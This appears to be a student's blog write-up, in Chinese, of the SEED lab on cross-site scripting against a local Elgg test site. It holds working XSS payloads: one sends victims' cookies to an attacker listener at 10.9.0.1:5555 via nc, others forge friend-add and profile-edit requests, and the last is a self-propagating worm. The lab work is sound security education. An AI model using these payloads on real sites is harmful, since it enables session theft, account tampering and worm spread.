@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/haha.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/haha.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第一周两个实验中的第一个，总共有6个小任务。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS-2">
+<meta property="og:url" content="http://example.com/2022/08/30/XSS-2/index.html">
+<meta property="og:site_name" content="isZeroStar&#39;blog">
+<meta property="og:description" content="第一周两个实验中的第一个，总共有6个小任务。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/prepar1.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/prepar2.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/prepar3.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task1.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task1-1.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task1-2.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task1-3.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task1-4.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task2-1.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task2-2.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task2-3.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task4-1.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task4-2.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task4-3.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task5-1.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task5-2.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task5-3.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task5-4.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task6-1.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task6-2.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task6-3.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task6-4.jpg">
+<meta property="og:image" content="http://example.com/2022/08/30/XSS-2/task6-5.jpg">
+<meta property="article:published_time" content="2022-08-29T17:32:30.000Z">
+<meta property="article:modified_time" content="2022-08-31T07:45:53.257Z">
+<meta property="article:author" content="isZeroStarChen">
+<meta property="article:tag" content="生产实习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/30/XSS-2/prepar1.jpg">
+
+<link rel="canonical" href="http://example.com/2022/08/30/XSS-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>XSS-2 | isZeroStar'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">isZeroStar'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生有梦，各自精彩</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">27</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/30/XSS-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="isZeroStarChen">
+      <meta itemprop="description" content="愿世间美好与你环环相扣">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="isZeroStar'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XSS-2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-30 01:32:30" itemprop="dateCreated datePublished" datetime="2022-08-30T01:32:30+08:00">2022-08-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-31 15:45:53" itemprop="dateModified" datetime="2022-08-31T15:45:53+08:00">2022-08-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第一周两个实验中的第一个，总共有6个小任务。</p>
+<span id="more"></span>
+<h1 id="Preparation-安装HTTP-Header-Live"><a href="#Preparation-安装HTTP-Header-Live" class="headerlink" title="Preparation:安装HTTP Header Live"></a>Preparation:安装HTTP Header Live</h1><p>如果是没有安装的情况下，我们打开FireFox的设置栏，选中添加插件，搜索插件名并添加即可。<br><img src="/2022/08/30/XSS-2/prepar1.jpg" alt="prepar1"><img src="/2022/08/30/XSS-2/prepar2.jpg" alt="prepar2"><img src="/2022/08/30/XSS-2/prepar3.jpg" alt="prepar3"></p>
+<h1 id="Task1-发布恶意消息显示警告窗口"><a href="#Task1-发布恶意消息显示警告窗口" class="headerlink" title="Task1:发布恶意消息显示警告窗口"></a>Task1:发布恶意消息显示警告窗口</h1><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>攻击者在攻击者主页的配置文件中插入一段JavaScript代码，<br>在受害者访问攻击者主页的时候，这段代码会被执行，从而<strong>显示一个警告窗口</strong>。</p>
+<h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(’XSS’);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、以samy身份登入，并在主页profile插入HTML代码，保存后发现已经出了弹窗</p>
+<p>2、退出samy身份，登录alice账号，打开member墙，进入samy主页，发现alice账户下也出现弹窗。</p>
+<p><strong>注：一定要在HTML编辑下插入代码，如果第三张图中的右边按钮部分写的是HTML，那就需要摁一下，如果是如图所示，那就不需要。</strong></p>
+<h2 id="复现结果"><a href="#复现结果" class="headerlink" title="复现结果"></a>复现结果</h2><p><img src="/2022/08/30/XSS-2/task1.jpg" alt="task1"><img src="/2022/08/30/XSS-2/task1-1.jpg" alt="task1-1"><img src="/2022/08/30/XSS-2/task1-2.jpg" alt="task1-2"><img src="/2022/08/30/XSS-2/task1-3.jpg" alt="task1-3"><img src="/2022/08/30/XSS-2/task1-4.jpg" alt="task1-4"></p>
+<h1 id="Task2-发布恶意消息显示Cookie"><a href="#Task2-发布恶意消息显示Cookie" class="headerlink" title="Task2:发布恶意消息显示Cookie"></a>Task2:发布恶意消息显示Cookie</h1><h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>攻击者在攻击者主页的配置文件中插入一段JavaScript代码，<br>在受害者访问攻击者主页的时候，这段代码会被执行，从而显示<strong>在受害者面前网页弹窗显示受害者Cookie</strong>。</p>
+<h2 id="实验代码-1"><a href="#实验代码-1" class="headerlink" title="实验代码"></a>实验代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现步骤-1"><a href="#复现步骤-1" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、以samy身份登入，并在主页profile插入以下代码</p>
+<p>2、发现已经出了弹窗，弹窗现在显示的是samy的Cookie，</p>
+<p>3、退出samy身份，登录alice，打开member墙，进入samy主页，弹出alice的Cookie。</p>
+<h2 id="复现结果-1"><a href="#复现结果-1" class="headerlink" title="复现结果"></a>复现结果</h2><p><img src="/2022/08/30/XSS-2/task2-1.jpg" alt="task2-1"><img src="/2022/08/30/XSS-2/task2-2.jpg" alt="task2-2"><img src="/2022/08/30/XSS-2/task2-3.jpg" alt="task2-3"></p>
+<h1 id="Task3-从受害者的机器窃取Cookie"><a href="#Task3-从受害者的机器窃取Cookie" class="headerlink" title="Task3:从受害者的机器窃取Cookie"></a>Task3:从受害者的机器窃取Cookie</h1><h2 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>在Task2的基础上，<strong>将受害者的Cookie借由img标记发起的HTTP GET请求，发送给攻击者机器的指定端口</strong>。</p>
+<h2 id="实验代码-2"><a href="#实验代码-2" class="headerlink" title="实验代码"></a>实验代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(’&lt;img src=http:<span class="comment">//10.9.0.1:5555?c=’</span></span><br><span class="line">+ <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie) + ’&gt;’);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc -lknv 10.9.0.1 5555</span></span><br></pre></td></tr></table></figure>
+<h2 id="复现步骤-2"><a href="#复现步骤-2" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、在命令行中输入监听指定IP的端口号命令。</p>
+<p>2、以samy身份登入，并在主页profile插入代码，保存后退出。</p>
+<p>3、再登上alice账号访问samy主页，此时监听窗口会有带着加密的受害者Cookie出现。</p>
+<h2 id="复现结果-2"><a href="#复现结果-2" class="headerlink" title="复现结果"></a>复现结果</h2><p>复现不出来，排除不了问题，监听窗口得不到反馈信息。</p>
+<h1 id="Task4-攻击者强制加受害者为好友"><a href="#Task4-攻击者强制加受害者为好友" class="headerlink" title="Task4:攻击者强制加受害者为好友"></a>Task4:攻击者强制加受害者为好友</h1><h2 id="攻击原理-3"><a href="#攻击原理-3" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>利用FireFox中的HTTP检测工具，<br>查看添加朋友的HTTP请求信息，据此来伪造HTTP请求，从而达到添加好友的功能。</p>
+<h2 id="实验代码-3"><a href="#实验代码-3" class="headerlink" title="实验代码"></a>实验代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> Ajax=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts; </span><br><span class="line"><span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token; </span><br><span class="line"><span class="comment">//Construct the HTTP request to add Samy as a friend.</span></span><br><span class="line"><span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span>+ts+token;</span><br><span class="line"><span class="comment">//Create and send Ajax request to add friend</span></span><br><span class="line">Ajax=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">Ajax.open(<span class="string">&quot;GET&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">Ajax.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现步骤-3"><a href="#复现步骤-3" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、登录samy账号，在samy的profile中的About me中，以HTML输入代码。</p>
+<p>2、登录alice账号，点击alice的friend页面，发现没有，再去点击member页面中samy的主页，此时alice回到自己的friend页面，发现多了一个samy。</p>
+<h2 id="复现结果-3"><a href="#复现结果-3" class="headerlink" title="复现结果"></a>复现结果</h2><p><img src="/2022/08/30/XSS-2/task4-1.jpg" alt="task4-1"><img src="/2022/08/30/XSS-2/task4-2.jpg" alt="task4-2"><img src="/2022/08/30/XSS-2/task4-3.jpg" alt="task4-3"></p>
+<h1 id="Task5-修改受害者的配置文件信息"><a href="#Task5-修改受害者的配置文件信息" class="headerlink" title="Task5:修改受害者的配置文件信息"></a>Task5:修改受害者的配置文件信息</h1><h2 id="攻击原理-4"><a href="#攻击原理-4" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>用HTTP Header live工具查看如何构造POST请求来修改配置文件，从而编写一个恶意JavaScript程序，直接从受害者的浏览器伪造HTTP请求，而不需要攻击者的干预。</p>
+<h2 id="实验代码-4"><a href="#实验代码-4" class="headerlink" title="实验代码"></a>实验代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> userName=<span class="string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;</span><br><span class="line">    <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;</span><br><span class="line">    <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;</span><br><span class="line">    <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;</span><br><span class="line">    <span class="keyword">var</span> name=<span class="string">&quot;&amp;name=&quot;</span>+ elgg.session.user.name;</span><br><span class="line">    <span class="keyword">var</span> desc=<span class="string">&quot;&amp;description=tuchen is my hero&quot;</span> + <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Construct the content of your url.</span></span><br><span class="line"><span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> content=token+ts+name+desc+guid;</span><br><span class="line"><span class="keyword">if</span>(elgg.session.user.guid!=<span class="number">59</span>)&#123;</span><br><span class="line">    <span class="comment">//Create and send Ajax request to modify profile</span></span><br><span class="line">    <span class="keyword">var</span> Ajax=<span class="literal">null</span>;</span><br><span class="line">    Ajax=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    Ajax.open(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">    Ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    Ajax.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现步骤-4"><a href="#复现步骤-4" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、先用Charlie的账户登录，打开HTTP Headers Live，然后对Charlie的主页配置文件进行编辑，得到HTTP报文头文件，根据这报文信息，从而进行伪造。</p>
+<p>2、登录samy账号，在samy的profile中的About me中，以HTML输入代码。</p>
+<p>3、登录alice账号，先查看自己的profile，再去查看samy的profile，这时alice的profile就已经被更改。</p>
+<h2 id="复现结果-4"><a href="#复现结果-4" class="headerlink" title="复现结果"></a>复现结果</h2><p><img src="/2022/08/30/XSS-2/task5-1.jpg" alt="task5-1"><img src="/2022/08/30/XSS-2/task5-2.jpg" alt="task5-2"><img src="/2022/08/30/XSS-2/task5-3.jpg" alt="task5-3"><img src="/2022/08/30/XSS-2/task5-4.jpg" alt="task5-4"></p>
+<h1 id="Task6-编写一个自传播的XSS蠕虫"><a href="#Task6-编写一个自传播的XSS蠕虫" class="headerlink" title="Task6:编写一个自传播的XSS蠕虫"></a>Task6:编写一个自传播的XSS蠕虫</h1><h2 id="攻击原理-5"><a href="#攻击原理-5" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>创建的JavaScript恶意程序不仅能够修改受害者的配置文件，<br>而且能将自我的文件添加到受害者的配置文件中，这样第一轮的受害者就变成了第二轮传播<br>的攻击者。</p>
+<h2 id="实验代码-5"><a href="#实验代码-5" class="headerlink" title="实验代码"></a>实验代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> id=<span class="string">&quot;worm&quot;</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> headerTag = <span class="string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> jsCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;worm&quot;</span>).innerHTML;</span><br><span class="line">  <span class="keyword">var</span> tailTag = <span class="string">&quot;&lt;/&quot;</span> + <span class="string">&quot;script&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> name=<span class="string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;</span><br><span class="line">  <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;</span><br><span class="line">  <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;</span><br><span class="line">  <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;</span><br><span class="line">  <span class="keyword">var</span> desc= <span class="string">&quot;&amp;description=tuchen is my hero&quot;</span> + wormCode;</span><br><span class="line">  desc += <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> content= token+ ts+ name+ desc+ guid;</span><br><span class="line">  <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(elgg.session.user.guid!=<span class="number">59</span>)&#123;</span><br><span class="line">    <span class="comment">//Create and send Ajax request to modify profile</span></span><br><span class="line">    <span class="keyword">var</span> Ajax=<span class="literal">null</span>;</span><br><span class="line">    Ajax=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    Ajax.open(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">    Ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    Ajax.send(content);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="复现步骤-5"><a href="#复现步骤-5" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、登录samy账号，在samy的profile中的About me中，以HTML输入代码。</p>
+<p>2、登录alice账号，先查看自己的profile，再去查看samy的profile，这时alice的profile就已经被更改并且染上了蠕虫。</p>
+<p>3、登录boby账号，先查看自己的profile，再去查看alice的profile，这时boby的profile就已经被更改并且染上了蠕虫。</p>
+<p>在这个任务中，samy作为第一轮的攻击者，使第一轮受害者alice的profile被更改并附上了蠕虫病毒。<br>而在第二轮传播中，alice作为第二轮的攻击者，对第二轮的受害者boby进行攻击。</p>
+<h2 id="复现结果-5"><a href="#复现结果-5" class="headerlink" title="复现结果"></a>复现结果</h2><p><img src="/2022/08/30/XSS-2/task6-1.jpg" alt="task6-1"><img src="/2022/08/30/XSS-2/task6-2.jpg" alt="task6-2"><img src="/2022/08/30/XSS-2/task6-3.jpg" alt="task6-3"><img src="/2022/08/30/XSS-2/task6-4.jpg" alt="task6-4"><img src="/2022/08/30/XSS-2/task6-5.jpg" alt="task6-5"></p>
+<h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>在对照任务书进行学习的时候，发现任务书上部分提供的代码是需要自己进行填充的，包括任务四和任务五，学习能力有所提高。也存在细节需要注意，比如编辑JavaScript恶意程序时，需要注意编辑器是否是edit HTML。</p>
+<p>平台挺好，就是任务三不知道存在什么问题，复现不出来，可能是版本原因亦或者是这个任务后台文件也已经被修改过了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i># 生产实习</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/29/XSS-1/" rel="prev" title="XSS-1">
+      <i class="fa fa-chevron-left"></i> XSS-1
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Preparation-%E5%AE%89%E8%A3%85HTTP-Header-Live"><span class="nav-number">1.</span> <span class="nav-text">Preparation:安装HTTP Header Live</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task1-%E5%8F%91%E5%B8%83%E6%81%B6%E6%84%8F%E6%B6%88%E6%81%AF%E6%98%BE%E7%A4%BA%E8%AD%A6%E5%91%8A%E7%AA%97%E5%8F%A3"><span class="nav-number">2.</span> <span class="nav-text">Task1:发布恶意消息显示警告窗口</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">实验代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.3.</span> <span class="nav-text">复现步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C"><span class="nav-number">2.4.</span> <span class="nav-text">复现结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task2-%E5%8F%91%E5%B8%83%E6%81%B6%E6%84%8F%E6%B6%88%E6%81%AF%E6%98%BE%E7%A4%BACookie"><span class="nav-number">3.</span> <span class="nav-text">Task2:发布恶意消息显示Cookie</span></a><ol class="nav-child"><li 